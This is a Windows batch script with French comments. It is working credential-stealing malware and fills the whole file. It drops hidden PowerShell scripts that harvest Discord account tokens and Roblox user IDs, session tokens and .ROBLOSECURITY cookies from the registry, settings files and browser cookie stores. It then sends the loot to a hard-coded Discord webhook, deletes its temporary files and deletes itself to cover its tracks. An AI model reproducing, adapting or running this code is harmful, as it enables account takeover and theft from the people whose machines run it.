@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION AVEC CONFIRMATION D'ENVOI

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: Création d'un script PowerShell pour l'envoi de messages
set "send_ps=%TEMP%\send.ps1"
(
echo function Send-DiscordMessage {
echo     param([string]$Message)
echo     $payload = @{ content = $Message } ^| ConvertTo-Json
echo     try {
echo         Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
echo         Write-Output "OK"
echo     } catch {
echo         Write-Output "ERREUR: $_"
echo     }
echo }
echo # Envoi du message de test
echo $test = Send-DiscordMessage "=== TEST : Exécution du script ==="
echo if ($test -eq "OK") { Write-Output "TEST_REUSSI" } else { Write-Output "TEST_ECHEC" }
) > "%send_ps%"

:: Exécuter le test
for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -File "%send_ps%" 2^>nul') do set "test_result=%%a"
del /f /q "%send_ps%" >nul 2>&1

:: Si le test échoue, sortir sans exécuter le reste (mais on va continuer pour envoyer un diagnostic)
if not "!test_result!"=="TEST_REUSSI" (
    :: On va créer un message d'erreur et l'envoyer via un autre moyen
    set "msg=ERREUR: Le webhook ne répond pas. Vérifiez l'URL."
    goto :send_fallback
)

:: ===== EXTRACTION DES DONNEES =====
set "psfile=%TEMP%\extract.ps1"
set "outfile=%TEMP%\result.txt"
(
echo # --- TOKENS DISCORD ---
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $pattern = '[a-zA-Z0-9_\-]{20,80}\.[a-zA-Z0-9_\-]{6,30}\.[a-zA-Z0-9_\-]{20,100}'
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $pattern -AllMatches -ErrorAction SilentlyContinue ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discord = $tokens -join ' '
echo.
echo # --- ROBLOX : REGISTRE ---
echo $user = $null
echo $remember = $null
echo try { $user = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID } catch {}
echo try { $remember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe } catch {}
echo.
echo # --- ROBLOX : XML ---
echo $xmlToken = $null
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo if (Test-Path $xmlPath) {
echo     try {
echo         $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo         if ($xml -and $xml.settings -and $xml.settings.token) { $xmlToken = $xml.settings.token }
echo     } catch {}
echo }
echo.
echo # --- ROBLOX : COOKIE .ROBLOSECURITY (recherche brute) ---
echo $cookie = $null
echo $files = @()
echo $files += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
echo $files += "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
echo $files += "$env:APPDATA\Microsoft\Windows\Cookies\*.txt"
echo $files += "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies\*.txt"
echo foreach ($f in $files) {
echo     if (Test-Path $f) {
echo         $matches = Select-String -Path $f -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -AllMatches -ErrorAction SilentlyContinue
echo         if ($matches) {
echo             foreach ($m in $matches) {
echo                 $val = $m.Matches.Value -replace 'ROBLOSECURITY=',''
echo                 if ($val.Length -gt 30) { $cookie = $val; break }
echo             }
echo         }
echo         if ($cookie) { break }
echo     }
echo }
echo.
echo # --- CONSTRUCTION DU MESSAGE ---
echo $msg = ""
echo if ($discord -ne "") { $msg += "=== TOKENS DISCORD ===`n$discord`n`n" }
echo if ($user -ne $null -and $user -ne "") { $msg += "=== ROBLOX UserID ===`n$user`n`n" }
echo if ($remember -ne $null -and $remember -ne "") { $msg += "=== ROBLOX RememberMe ===`n$remember`n`n" }
echo if ($xmlToken -ne $null -and $xmlToken -ne "") { $msg += "=== ROBLOX Token (XML) ===`n$xmlToken`n`n" }
echo if ($cookie -ne $null -and $cookie -ne "") { $msg += "=== ROBLOX Cookie (.ROBLOSECURITY) ===`n$cookie`n`n" }
echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: Exécuter l'extraction
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: Lire le résultat
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: Si msg est vide, mettre un message par défaut
if "!msg!"=="" set "msg=Erreur lors de l'extraction."

:: ===== ENVOI DU MESSAGE FINAL VIA POWERSHELL =====
:send_fallback
:: Si le test a échoué, msg contient déjà l'erreur, on l'envoie quand même
if "!test_result!"=="TEST_ECHEC" (
    set "msg=Test webhook échoué. Vérifiez l'URL. Détails: !msg!"
)

:: Créer un script d'envoi avec le message
set "send_ps2=%TEMP%\send2.ps1"
(
echo $payload = @{ content = '%msg%' } ^| ConvertTo-Json
echo Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
) > "%send_ps2%"

:: Exécuter l'envoi (en arrière-plan pour ne pas bloquer)
start /b "" powershell -NoProfile -ExecutionPolicy Bypass -File "%send_ps2%"

:: Attendre un peu pour que l'envoi ait le temps de se faire
timeout /t 2 /nobreak >nul 2>&1

:: Nettoyage
del /f /q "%send_ps2%" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
exit /b 0
